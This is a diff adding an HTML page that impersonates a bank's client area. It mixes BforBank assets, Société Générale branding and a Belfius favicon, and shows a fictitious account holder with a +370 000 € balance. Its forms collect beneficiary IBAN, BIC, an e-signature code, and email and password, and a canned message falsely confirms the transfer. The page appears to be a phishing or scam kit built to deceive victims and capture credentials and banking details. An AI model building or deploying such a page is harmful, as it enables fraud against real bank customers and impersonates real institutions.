@@ -1,0 +1,510 @@
+
+<!DOCTYPE html>
+
+<!--if IE 8html.ie8(lang="en")
+-->
+<!--if IE 9html.ie9(lang="en")
+-->
+<!-- [if !IE] <!-->
+<html lang="en">
+<!-- <![endif]-->
+<!--head de la page-->
+<head>
+    <!-- Meta -->
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="author" content="BforBank" />
+    <meta name="description" content="Gérez vos comptes BforBank en ligne : compte bancaire, assurance-vie, livrets, bourse" />
+    <meta name="format-detection" content="telephone=no" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel="stylesheet" href="./style.css">
+    <!--[if IE]>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,IE=9,IE=8,chrome=1"/>
+    <![endif]-->
+
+    <!-- Title -->
+    <title>Espace client : Virement bancaires - SOCIÉTÉ GÉNÉRALE</title>
+
+    <!-- Style sheets -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,500,600,700,200,100,800" rel="stylesheet" type="text/css" />
+    <!--[if lt IE 9]>
+    <link rel="icon" th:href="${application.staticRoot + '/img/favicon.ico'}"/>
+    <![endif]-->
+    <!--[if (gte IE 9) | (!IE)]><!-->
+     <link rel="icon" href="https://fernelmont.ecolo.be/wp-content/uploads/sites/67/2018/02/Belfius-logo-2012-stacked.png" />
+     
+    <!--<![endif]-->
+    <link rel="stylesheet" href="https://static.bforbank.com/css/ec-third-party.min.css" />
+    <link rel="stylesheet" href="https://static.bforbank.com/css/ec-style.min.css" />
+    <link rel="stylesheet" type="text/css" media="print" href="https://static.bforbank.com/css/ec-print.min.css" />
+
+    <style>
+        body {
+            background-image: url(https://www.bforbank.com//files/live/sites/Bforbank/files/contributed/produits/espace-client/background.jpg);
+        }
+    </style>
+</head>
+<body class="layout-boxed ec-layout">
+<div class="nav-left-container">
+    <!-- Colonne de gauche -->
+    <div class="nav-left">
+        <nav class="navbar-content">
+    <div class="navbar-content">
+        <!-- start: SIDEBAR-->
+        <div class="main-navigation left-wrapper transition-left">
+            <!-- start: MAIN NAVIGATION MENU-->
+            <ul class="main-navigation-menu">
+                <li>
+                    <a href="../../session.html">
+                        <i class="fa fa-calculator"></i><span class="title">MES COMPTES</span>
+                    </a>
+                    <ul class="sub-menu">
+                        <li>
+                            <a class="send-tc-submit" data-tc-name="navigation::menu::synthese|navigation menu||mon espace|synthese" href="../../session.php"><span>Synthèse</span></a></li>
+                        <li>
+                            
+                            <a href="javascript:void(0)" class="comptes send-tc-submit" data-tc-name="navigation::menu::dav|navigation menu||mon espace|dav">
+                                <span>Compte et cartes</span>
+                            </a>
+                            <ul class="sub-menu">
+                                <li>
+                                    <a class="follow" href="../../page2">
+                                        <span class="num-compte">Compte n° 12340100674705</span>
+                                        <br />
+                                        <span>
+                                            <span>M.</span>
+                                            <span>SOFIA ROSSO</span>
+                                        </span>
+                                        
+
+                                    </a>
+
+                                </li>
+                                
+                            </ul>
+                        </li>
+                        
+                        <li>
+                            <a class="send-tc-submit" data-tc-name="navigation::menu::assurances|navigation menu||mon espace|assurances" href="">
+                                <span>Assurances</span>
+                            </a>
+                            
+                        </li>
+                        
+                        <li>
+                            <a class="send-tc-submit" data-tc-name="navigation::menu::livrets|navigation menu||mon espace|livrets" href="">
+                                <span>Livrets</span></a>
+                            
+                            <ul id="livretsSubMenu" class="sub-menu">
+                                
+                                <!-- EGG-849 -->
+                                
+                                
+                                
+                            </ul>
+                        </li>
+
+                        
+                        <li>
+
+                            <a class="comptes-true-link send-tc-submit" data-tc-type="N" data-tc-name="navigation::menu::titres|navigation menu||mon espace|titres" href="">
+                                <span>Titres</span>
+                            </a>
+
+                            <ul id="titresSubMenu" class="sub-menu">
+                                
+
+                                
+                                <!-- la promotion est activée si le client possède au moins un compte titre -->
+                                
+                            </ul>
+                        </li>
+
+                        
+                        <li>
+                            <a class="send-tc-submit" data-tc-name="navigation::menu::assurance vie|navigation menu||mon espace|assurance vie" href="e">
+                                <span>Assurance-vie</span>
+                            </a>
+                            
+                        </li>
+                        
+                        <li>
+                            <a class="send-tc-submit" data-tc-name="navigation::menu::credit consommation|navigation menu||mon espace|credit consommation" href="">
+                                <span>Crédit consommation</span>
+                            </a>
+                        </li>
+                        
+                        <li>
+                            <a class="send-tc-submit" data-tc-type="N" data-tc-name="navigation::menu::::credit immobilier|navigation menu||mon espace|credit immobilier" href="">
+                                <span>Crédit immobilier</span>
+                            </a>
+                            <ul id="creditImmobilierSubMenu" class="sub-menu">
+                                
+                            </ul>
+                        </li>
+                    </ul>
+                </li>
+
+
+                
+
+                <!--Menu Services avec ces sous menus : - Mobilité Bancaire &  - Autres services-->
+                
+
+                
+                 <li>
+                    <li class="active"><a class="send-tc-submit" data-tc-name="navigation::menu::virements|navigation menu||mon espace|virements" href="index.html">
+                        <i class="fa fa-exchange"></i>
+                        <span class="title">VIREMENTS</span>
+                    </a>
+
+                   
+                </li>
+                <li><a class="send-tc-submit" data-tc-name="navigation::menu::virements|navigation menu||mon espace|virements" href=""><i class="fa fa-cogs"></i><span class="title">SERVICES</span></a></li>
+
+                <li><a class="send-tc-submit" data-tc-name="navigation::menu::rib|navigation menu||mon espace|rib" href="../../RIB.html"><i class="fa fa-list-alt"></i><span class="title">RIB</span></a></li>
+
+                <li><a class="send-tc-submit" data-tc-name="navigation::menu::docubase|navigation menu||mon espace|docubase" href=""><i class="fa fa-file-text-o"></i><span class="title">MES DOCUMENTS</span></a>
+                </li>
+                <li>
+                    <a class="send-tc-submit" data-tc-name="navigation::menu::offres a saisir|navigation menu||mon espace|offres a saisir" href="">
+                        <i class="fa fa-certificate"></i>
+                        <span class="title">MES OFFRES</span>
+                    </a>
+                </li>
+                <li>
+                    <a class="send-tc-submit" data-tc-name="navigation::menu::mon profil|navigation menu||mon espace|mon profil" href="">
+                        <i class="fa fa-user"></i>
+                        <span class="title">MON PROFIL</span>
+                    </a>
+                </li>
+                <li>
+                    <a class="send-tc-submit" data-tc-type="N" data-tc-name="navigation::menu::parrainage|navigation menu||mon espace|parrainage" href=""></i>
+                        <span class="title">PARRAINAGE</span>
+                    </a>
+                </li>
+            </ul>
+            <div class="clearfix"></div>
+            <!-- end: MAIN NAVIGATION MENU-->
+        </div>
+        <!-- end: SIDEBAR-->
+    </div>
+</nav>
+    </div>
+</div>
+<!--Conteneur principal de la page-->
+<div class="main-wrapper">
+    <div class="site-canvas">
+        <!-- Header de la page -->
+        
+    <header class="ec-header navbar">
+        <!-- start: TOPBAR CONTAINER-->
+        <div class="container">
+            <div class="navbar-header">
+                <!-- start: LOGO-->
+                 <a class="navbar-bran" href=""> <img alt="Banque en ligne " src="https://www.societegenerale.com/sites/default/files/styles/rte_affichage_defaut_desktop/public/image/2023-04/logo-societe-generale.png?itok=9tsodGw3" width="230" />
+                </a>
+                <!-- end: LOGO-->
+            </div>
+            <ul class="nav navbar-header-toolbar">
+                <li><a href="#" data-target=".modal-dcnx" data-toggle="modal" data-tc-name="navigation::menu::deconnexion|navigation menu||mon espace|deconnexion" class="send-tc-submit"><i class="fa fa-power-off"></i>DÉCONNEXION</a>
+                    </li>
+                <li><a data-tc-name="navigation::menu::renvoi contact|navigation menu||mon espace|renvoi contact" class="send-tc-submit" href=""><i class="fa fa-envelope"></i>CONTACT</a></li>
+                <li><a data-tc-name="navigation::menu::renvoi opposition|navigation menu||mon espace|" class="send-tc-submit" href=""><i class="fa fa-ban"></i>OPPOSITION</a></li>
+            </ul>
+
+        </div>
+    </header>
+    <header class="ec-header-sm">
+        <a href="#" class="ec-header-sm-menu toggle-nav">☰</a><a class="ec-header-sm-logout" href="../../index.php"><i class="fa fa-power-off"></i></a>
+        <div class="ec-header-sm-logo">
+           
+                </a>
+<img alt="Banque en ligne - " src="https://www.societegenerale.com/sites/default/files/styles/rte_affichage_defaut_desktop/public/image/2023-04/logo-societe-generale.png?itok=9tsodGw3"width="50" />
+            </div>
+    </header>
+    
+    <div>
+    <!-- Modale de deconnexion -->
+    <div aria-hidden="true" aria-labelledby="myModalLabel" role="dialog" tabindex="-1" class="modal modal-dcnx fade">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+                    <h4 class="modal-title">Déconnexion</h4>
+                </div>
+                <div class="modal-body">
+                    <p>Voulez-vous vraiment vous déconnecter ?</p>
+                </div>
+                <div class="modal-footer">
+                    <button aria-hidden="true" data-dismiss="modal" type="button" class="btn btn-light-grey btn-squared pull-left">Annuler</button>
+                    <a type="button" class="btn btn-primary btn-squared" href="../../index.php">Confirmer</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--  -->
+</div>
+
+
+        <div class="ec-main-container inner">
+            <div class="main-content">
+                <!-- Corps de page -->
+                <div class="page-content">
+
+                    
+
+
+                    <div class="jahia-top hidden-print">
+        
+        <div>
+        
+        <div>
+            <div class='ajax-jahia' data-src='https://www.bforbank.com/contenus-unitaires/espace-client/auto-promotion/toutes-rubriques.html #autopromo-produits-hors-DAV-haut'></div>
+                
+        </div>
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+    </div>
+                    <div class="jahia-msg hidden-print">
+
+    
+
+    <!-- Corps de page -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+            <div class='ajax-jahia' data-src='https://www.bforbank.com/contenus-unitaires/espace-client/messages-client.html #msg-autres-rubriques'></div>
+        
+    
+</div>
+                    <div id="pagecontent" class="page">
+    <div class="tabbable">
+        <div class="tab-content">
+            <div class="tab-pane fade active in">
+            
+    
+                
+                  
+                  
+
+
+
+
+
+
+<br><br><br><br><br>
+        
+        
+        
+            
+<div id="app" v-cloak>
+
+<!-- partial:index.partial.html -->
+
+
+                   <div style="float: right;">   
+                            <strong>Bonjour Mlle. SOFIA ROSSO</strong><br />
+
+                        
+ 
+<script type="text/javascript">
+var ladate=new Date()
+document.write(" Dernière connexion: "); 
+document.write(ladate.getDate()+"/"+(ladate.getMonth()+1)+"/"+ladate.getFullYear())``
+</script> <br>
+</div> 
+<span > Solde au  <span style="color: green; font-size: 13px">+370 000,00&nbsp;€</span></span>
+
+
+    <transition name='form' mode='out-in'>
+      <keep-alive>
+         <component :feedback='feedback' :is="currentComponent"
+         @register-form='handleForm' @signin-form='handleForm'></component>
+      </keep-alive>
+    </transition>
+
+ </div>
+
+     
+ <!-- Register Template -->
+ <template id="registerTemplate">
+
+    <form @submit.prevent='onSubmit'  ref='form' action="" class='register-form'>
+     
+        <p class="txt"></p>         
+     </div> 
+      <h2>BÉNÉFICIAIRE</h2>
+
+      <div class="form-group" >
+
+         <label for="firstname">Nom et Prénom</label>
+         <input required type="text" v-model.trim='user.firstname' id='firstname' id='passwordcheck' placeholder="Ex: Sophie DURAND">
+      </div>
+      <div class="form-group" >
+         <label for="password">IBAN</label>
+         <input type="text" v-model.trim='user.email' id='email'  placeholder="Ex: CH 84 00933 0000 3920 303"  id='passwordcheck' name=""> 
+      </div>
+      <div class="form-group">
+         <label for="password">BIC/SWIFT</label>
+         <input required type="text" v-model.trim='user.lastname' id='lastname'  placeholder="Ex: CRESHZZ80">
+      </div>
+      <div class="form-group">
+         <label for="lastname">Montant</label>
+          <input required type="number"  id='passwordcheck'   placeholder="Ex: 10 000 €">
+
+      </div>
+      <div class="form-group">
+         <label for="email">Motif de l'opération</label>
+         <input required type="text"  v-model='user.password' placeholder="Ex: Bonne fête des mère" id='password'>
+      </div>
+      <h2>DONNEUR D'ORDRE</h2>
+      <div class="form-group">
+         <label for="passwordcheck">Nom et prénom</label>
+         <input required type="text"  v-model='user.passwordChck' placeholder="Ex: THOMAS" id='passwordcheck'>
+      </div>
+      <div class="form-group">
+         <label for="passwordchec">Introduisez l'e-signature</label>
+         <input type="text" placeholder="Ex: 3553" id='passwordcheck' name=""> 
+      </div>
+      <div class="form-group">
+         <label for="passwordcheck">Date du virement</label>
+         <input type="date" placeholder="Ex: 01/01/2021" id='passwordcheck' name=""> 
+      </div>
+      <input type="submit"  value='Valider'>
+
+    </form>
+ </template>
+
+ <!-- Signin Template -->
+ <template id="signinTemplate">
+    <form ref='form' @submit.prevent='handleForm' action="" class='signin-form'>
+      <h2>Signin</h2>
+      <div class="form-group">
+         <label for="email">Adresse électronique</label>
+         <input required v-model='user.email' type="email" id='email' placeholder="Adresse électronique">
+      </div>
+      <div class="form-group">
+         <label for="password">Mot de passe</label>
+         <input required v-model='user.password' type="password" id='password' placeholder="Mot de passe">
+      </div>
+      <input :disabled='!isFormValid'  type="submit" value="Signin">
+    </form>
+ </template>
+
+ <!-- Feedback Template -->
+
+
+ <template id="feedbackTemplate">
+    <div class="feedback">
+      <header>
+         <h2>{{ title }}</h2>
+      </header>
+      <div v-if='feedback.type === "register"'>
+        <p>Bénéficiaire <strong style="color:green;">{{ feedback.data | name }}</strong></p>
+        <p>IBAN <strong style= "color:green;">{{ feedback.data | email }}</strong></p>
+    
+        <p> Félicitation ! votre transaction vers l’IBAN :  {{ feedback.data | email }} à été transféré à la banque du bénéficiaire et le virement devrait figurer à son compte. Veuillez prévoir un 5 jours de traitement supplémentaire pour les jours fériés. Si vous rencontrez, des difficultés, veuillez envoyer un couriel à notre service clientèle.<br><br>
+          
+
+      </div>
+      <div v-else>
+         <p>Vous allez être redirigé(e) dans quelques instants...</p>
+      </div>
+    </div>
+ </template>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.3/vue.min.js'></script><script  src="./scripts.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                    <div class="jahia-footer hidden-print">
+        <div>
+        
+        <div>
+            <div class='ajax-jahia' data-src='https://www.bforbank.com/contenus-unitaires/espace-client/auto-promotion/toutes-rubriques.html #autopromo-produits-hors-DAV-bas'></div>
+                
+        </div>
+        
+                
+                
+                
+        
+        
+       </div> 
+    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="ep-layout">
+    <div class='ajax-jahia' data-src='https://www.bforbank.com/contenus-unitaires/espace-client.html #div-ep-footer-sub-container'></div>
+</div>
+</div>
+
+    <script>
+        var xiti_pagename = 'rib/synthese';
+    </script>   
+
+<div></div>
+
+    <script>
+        /*<![CDATA[*/
+            tc_vars = {};
+            tc_vars["env_work"] = 'prod';
+            tc_vars["user_id"] = 'A4816E5072630022E0530AC7A1172373';
+            tc_vars["user_logged"] = 2;
+        /*]]>*/
+    </script>
+    <!--[if lt IE 9]>
+    <script th:src="${application.staticRoot + '/js/ec-core-ie9-libs.js'}" type="text/javascript"></script>
+    <![endif]-->
+    <!--[if gte IE 9]><!-->
+    <script type="text/javascript" src="https://static.bforbank.com/js/ec-core-libs.js"></script>
+    <!--<![endif]-->
+    <noscript><iframe src="//redirect331.tagcommander.com/utils/noscript.php?id=1&amp;mode=iframe" width="1" height="1" rel="noindex,nofollow"></iframe></noscript>
+
+<div>
+    <script>
+        // variable iframe doit être assignée a true pour chacunes des pages ou l'on retrouve une iframe
+        var iframe = null;
+        if(!iframe){
+            var tc_bank = '';
+            loadjsfile(tc_bank);
+        }
+    </script>
+</div>
+<div></div>
+
+</body>
+</html>
